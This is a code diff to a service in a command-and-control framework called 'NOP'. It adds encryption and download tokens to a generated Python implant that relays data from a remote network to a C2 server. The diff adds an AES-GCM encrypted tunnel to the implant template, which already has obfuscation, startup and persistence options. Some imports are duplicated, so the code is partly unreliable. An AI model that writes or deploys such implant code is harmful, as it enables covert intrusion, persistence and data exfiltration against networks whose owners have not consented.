@@ -23,9 +23,21 @@ class AgentService:
         return secrets.token_urlsafe(32)
     
     @staticmethod
+    def generate_encryption_key() -> str:
+        """Generate a secure encryption key for agent-C2 tunnel"""
+        return secrets.token_urlsafe(32)
+    
+    @staticmethod
+    def generate_download_token() -> str:
+        """Generate a one-time download token"""
+        return secrets.token_urlsafe(32)
+    
+    @staticmethod
     async def create_agent(db: AsyncSession, agent_data: AgentCreate) -> Agent:
         """Create a new agent"""
         auth_token = AgentService.generate_auth_token()
+        encryption_key = AgentService.generate_encryption_key()
+        download_token = AgentService.generate_download_token()
         
         agent = Agent(
             name=agent_data.name,
@@ -33,11 +45,13 @@ class AgentService:
             agent_type=agent_data.agent_type,
             connection_url=agent_data.connection_url,
             auth_token=auth_token,
+            encryption_key=encryption_key,
+            download_token=download_token,
             capabilities=agent_data.capabilities,
             obfuscate=agent_data.obfuscate,
             startup_mode=agent_data.startup_mode,
             persistence_level=agent_data.persistence_level,
-            metadata=agent_data.metadata or {},
+            agent_metadata=agent_data.metadata or {},
             status=AgentStatus.DISCONNECTED
         )
         
@@ -119,10 +133,13 @@ class AgentService:
 NOP Agent - {agent.name}
 Generated: {datetime.utcnow().isoformat()}
 Type: Python Proxy Agent
+Encryption: AES-256-GCM (Encrypted tunnel to C2)
 
 This agent acts as a proxy, relaying all data from the remote network
 back to the NOP C2 server. All modules run here but data is processed
 on the main NOP instance.
+
+Download URL: {{BASE_URL}}/api/v1/agents/download/{agent.download_token}
 """
 
 import asyncio
@@ -135,28 +152,78 @@ import psutil
 import scapy.all as scapy
 from datetime import datetime
 from typing import Dict, List, Any
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+import base64
+import os
+from typing import Dict, List, Any
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+import base64
+import os
 
 # Agent Configuration
 AGENT_ID = "{agent.id}"
 AGENT_NAME = "{agent.name}"
 AUTH_TOKEN = "{agent.auth_token}"
+ENCRYPTION_KEY = "{agent.encryption_key}"
 SERVER_URL = "{agent.connection_url}"
 CAPABILITIES = {json.dumps(agent.capabilities, indent=4)}
 
 class NOPAgent:
-    """NOP Proxy Agent - Relays data from remote network to C2 server"""
+    """NOP Proxy Agent - Relays data from remote network to C2 server with encrypted tunnel"""
     
     def __init__(self):
         self.agent_id = AGENT_ID
         self.agent_name = AGENT_NAME
         self.auth_token = AUTH_TOKEN
+        self.encryption_key = ENCRYPTION_KEY.encode()
         self.server_url = SERVER_URL
         self.capabilities = CAPABILITIES
         self.ws = None
         self.running = True
+        self.cipher = self._init_cipher()
+    
+    def _init_cipher(self):
+        """Initialize AES-GCM cipher for encrypted communication"""
+        # Derive encryption key using PBKDF2
+        kdf = PBKDF2(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=b'nop_c2_salt_2026',
+            iterations=100000,
+        )
+        key = kdf.derive(self.encryption_key)
+        return AESGCM(key)
+    
+    def encrypt_message(self, data: str) -> str:
+        """Encrypt message for C2 transmission"""
+        nonce = os.urandom(12)
+        ciphertext = self.cipher.encrypt(nonce, data.encode(), None)
+        encrypted = base64.b64encode(nonce + ciphertext).decode()
+        return encrypted
+    
+    def decrypt_message(self, encrypted_data: str) -> str:
+        """Decrypt message from C2"""
+        data = base64.b64decode(encrypted_data)
+        nonce = data[:12]
+        ciphertext = data[12:]
+        plaintext = self.cipher.decrypt(nonce, ciphertext, None)
+        return plaintext.decode()
+        
+    async def send_encrypted(self, message: dict):
+        """Send encrypted message to C2"""
+        json_str = json.dumps(message)
+        encrypted = self.encrypt_message(json_str)
+        await self.ws.send(json.dumps({{
+            "encrypted": True,
+            "data": encrypted
+        }}))
         
     async def connect(self):
-        """Connect to NOP C2 server"""
+        """Connect to NOP C2 server with encrypted tunnel"""
         try:
             print(f"[{{datetime.now()}}] Connecting to C2 server: {{self.server_url}}...")
             async with websockets.connect(
@@ -164,7 +231,7 @@ class NOPAgent:
                 extra_headers={{"Authorization": f"Bearer {{self.auth_token}}"}}
             ) as websocket:
                 self.ws = websocket
-                print(f"[{{datetime.now()}}] Connected to C2 server!")
+                print(f"[{{datetime.now()}}] Connected! Establishing encrypted tunnel...")
                 
                 # Register with C2
                 await self.register()
